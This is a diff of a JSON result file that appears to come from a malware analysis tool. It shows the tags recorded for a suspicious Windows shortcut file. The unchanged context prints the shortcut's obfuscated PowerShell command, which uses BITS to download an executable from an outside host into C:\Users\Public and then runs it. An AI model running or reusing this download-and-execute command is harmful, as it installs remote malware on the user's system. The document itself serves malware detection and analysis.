@@ -3,7 +3,9 @@
         "supplementary": [
             "cd6290f9ddc608b4f35b9300f6abba1c1ddca36841daf62c9b4bc3f57a1c71ca"
         ],
-        "extracted": []
+        "extracted": [
+            "9a9e5cedd4cb21838c3eae79044b7c8b5a2e0e7c1e3beb64c89fb61761536c0b"
+        ]
     },
     "result": {
         "heuristics": [
@@ -11,14 +13,14 @@
             4
         ],
         "tags": {
-            "file.name.extracted": [
-                "powershell.exe"
-            ],
             "file.shortcut.icon_location": [
                 "C:\\Windows\\System32\\shell32.dll"
             ],
             "file.shortcut.command_line": [
                 "powershell.exe Start-BitsTransfer -Sou htt`p://3237.site/test01.e`xe -Dest C:\\Users\\Public\\o5impa.e`xe;C:\\Users\\Public\\o5impa.e`xe"
+            ],
+            "file.name.extracted": [
+                "powershell.exe"
             ]
         }
     }
